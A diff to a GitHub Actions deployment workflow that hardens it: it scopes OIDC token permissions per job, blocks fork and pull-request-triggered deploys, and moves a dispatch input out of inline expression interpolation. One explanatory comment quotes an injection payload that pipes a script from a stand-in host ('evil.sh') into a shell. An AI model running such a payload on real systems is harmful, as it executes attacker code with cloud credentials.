@@ -29,9 +29,12 @@ concurrency:
   group: deploy-${{ github.ref }}
   cancel-in-progress: false
 
+# Least privilege at the top, widened per job. `id-token: write` is the right
+# to mint an OIDC token that assumes the deploy role, so granting it workflow-
+# wide handed it to `preflight` as well, which only reads environment variables
+# and has no business being able to authenticate to AWS.
 permissions:
   contents: read
-  id-token: write # required to mint the OIDC token
 
 jobs:
   # Does this repository actually have what the deploy needs?
@@ -47,11 +50,25 @@ jobs:
   # missing in the run summary and skips, while a fully configured repository
   # is unaffected and deploys exactly as before.
   preflight:
-    # Skip when CI failed. `workflow_run` fires on completion regardless of
-    # outcome, so without this a red build would still deploy.
+    # Three conditions, and only the first is about CI being green.
+    #
+    # `workflow_run` runs in the base repository with full access to its
+    # secrets, whatever the run that triggered it. CI triggers on `pull_request`
+    # with no branch filter, and for a PR-triggered run `workflow_run.head_branch`
+    # is the *head* branch name — so a fork whose branch is named `main` matches
+    # `branches: [main]` above. Without an origin check the build job would then
+    # check out `workflow_run.head_sha` (the fork's commit) and hand its
+    # Dockerfile to a runner that has already assumed the deploy role. That is
+    # arbitrary code execution with AWS credentials in the environment.
+    #
+    # So: refuse anything whose head repository is not this repository, and
+    # refuse pull_request-triggered runs outright. Deployment follows a push to
+    # main, never a proposal to change it.
     if: >-
       github.event_name == 'workflow_dispatch' ||
-      github.event.workflow_run.conclusion == 'success'
+      (github.event.workflow_run.conclusion == 'success' &&
+       github.event.workflow_run.head_repository.full_name == github.repository &&
+       github.event.workflow_run.event != 'pull_request')
     runs-on: ubuntu-latest
     outputs:
       configured: ${{ steps.check.outputs.configured }}
@@ -98,6 +115,9 @@ jobs:
     if: needs.preflight.outputs.configured == 'true'
     runs-on: ubuntu-latest
     timeout-minutes: 45
+    permissions:
+      contents: read
+      id-token: write # assumes the deploy role to push to ECR
     outputs:
       image_tag: ${{ steps.meta.outputs.tag }}
 
@@ -111,9 +131,17 @@ jobs:
 
       - name: Resolve image tag
         id: meta
+        # Through env, not `${{ }}` inside the script. Expression interpolation
+        # is textual substitution performed before bash parses the line, so a
+        # dispatch input of `"; curl evil.sh | sh; #` runs on a runner holding
+        # AWS credentials — and a newline in it can forge extra $GITHUB_OUTPUT
+        # entries, including `tag`, which becomes the image reference. The
+        # preflight job already reads its inputs this way; this step did not.
+        env:
+          IMAGE_TAG_INPUT: ${{ inputs.image_tag }}
         run: |
-          if [ -n "${{ inputs.image_tag }}" ]; then
-            echo "tag=${{ inputs.image_tag }}" >> "$GITHUB_OUTPUT"
+          if [ -n "$IMAGE_TAG_INPUT" ]; then
+            echo "tag=$IMAGE_TAG_INPUT" >> "$GITHUB_OUTPUT"
           else
             echo "tag=sha-$(git rev-parse --short=12 HEAD)" >> "$GITHUB_OUTPUT"
           fi
@@ -174,6 +202,9 @@ jobs:
     needs: build
     runs-on: ubuntu-latest
     timeout-minutes: 30
+    permissions:
+      contents: read
+      id-token: write # assumes the deploy role to roll the ECS services
     # Gate production behind a reviewer. Configure required reviewers on the
     # environment in repository settings — the workflow cannot enforce that
     # itself.
